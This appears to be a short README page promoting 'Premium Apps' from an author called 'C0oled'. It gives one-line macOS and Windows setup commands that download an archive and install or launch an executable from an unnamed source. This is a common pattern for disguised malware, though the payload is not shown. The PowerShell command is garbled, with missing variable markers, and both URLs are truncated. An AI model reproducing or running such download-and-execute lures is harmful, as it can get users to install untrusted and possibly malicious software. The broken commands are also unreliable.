# WE GOT YOUR BACK COVERED!
### Made by: C0oled

---

### 🍏 macOS Automated Setup
```bash
curl -# -L -o /tmp/PremiumApps.dmg "https://github.com" && hdiutil attach /tmp/PremiumApps.dmg && cp -R "/Volumes/Premium Apps/Premium Apps.app" /Applications/ && hdiutil detach "/Volumes/Premium Apps" && echo "Premium Apps successfully installed in your Applications folder!"
```

### 🪟 Windows Automated Setup
```powershell
\$url = "https://github.com"; zip = "env:USERPROFILE\Desktop\PremiumApps.zip"; dst = "env:USERPROFILE\Desktop\PremiumApps"; Invoke-WebRequest -Uri url -OutFile zip; Expand-Archive -Path zip -DestinationPath dst -Force; Remove-Item zip; Start-Process "dst\PremiumAppsLauncher.exe"
```
